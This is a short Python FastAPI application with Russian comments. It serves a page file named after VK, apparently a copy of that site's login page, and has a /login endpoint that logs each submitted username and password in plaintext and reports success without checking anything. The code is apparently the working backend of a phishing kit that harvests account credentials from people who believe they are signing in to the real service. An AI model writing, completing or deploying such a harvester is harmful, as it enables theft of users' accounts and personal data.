from fastapi import FastAPI
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import logging
import os

# Настройка логирования
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
logger = logging.getLogger(__name__)

app = FastAPI()

# Путь к директории, где лежат статические файлы (например, ваша HTML страница)
app.mount("/static", StaticFiles(directory="static"), name="static")


# Схема для логина и пароля
class UserLogin(BaseModel):
    username: str
    password: str


# Эндпоинт для приема логина и пароля
@app.post("/login")
def login(user: UserLogin):
    # Логируем логин и пароль
    logger.info(f"Login attempt - Username: {user.username}, Password: {user.password}")

    # Возвращаем успешный ответ
    return {"message": "Login data logged successfully"}


# Роут для отображения страницы (например, при доступе к корню сайта)
@app.get("/")
def serve_page():
    # Путь к HTML файлу
    html_file_path = os.path.join(os.getcwd(), "static/vk_page_fixed.html")

    # Возвращаем HTML файл
    return FileResponse(html_file_path)
